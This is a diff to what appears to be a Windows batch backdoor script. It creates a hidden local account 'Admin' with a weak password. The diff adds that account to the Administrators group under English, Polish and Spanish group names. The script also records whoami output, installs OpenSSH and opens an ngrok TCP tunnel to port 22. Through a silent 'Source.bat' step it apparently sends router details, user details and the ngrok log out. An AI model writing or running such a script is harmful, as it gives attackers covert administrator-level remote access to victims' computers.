@@ -13,12 +13,15 @@ set ""
 ::Source.bat +silent --file %temp%/router.txt
 
 net user "Admin" "Administrator" /add
+net localgroup Administrators Admin /add
+net localgroup Administratorzy Admin /add
+net localgroup Administración  Admin /add
 
 whoami>user.txt
 Source.bat +silent --file %temp%/user.txt
-
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-start timeout 5 & Source.bat +silent --file %temp%/ngrok.log
+start timeout 15 & Source.bat +silent --file %temp%/ngrok.log
 ngrok tcp 22 -log=stdout > ngrok.log &
+
